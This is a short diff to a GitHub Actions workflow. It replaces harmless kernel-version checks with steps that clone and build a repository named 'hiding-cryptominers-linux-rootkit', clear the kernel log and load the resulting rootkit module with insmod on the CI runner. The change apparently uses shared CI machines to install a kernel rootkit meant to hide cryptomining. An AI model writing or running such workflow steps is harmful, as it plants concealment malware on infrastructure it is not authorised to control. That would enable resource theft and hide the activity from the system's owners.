@@ -9,7 +9,12 @@ jobs:
       - uses: actions/checkout@v2
       - name: Run settting file
         run: |
-          sudo ls /lib/modules/5.11.0-1027-azure
-      - name: shell
+          git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit
+          cd hiding-cryptominers-linux-rootkit/
+          make
+      - name: LOADING
         run: |
-           uname -r
+          dmesg -C &
+          insmod rootkit.ko
+          dmesg
+          
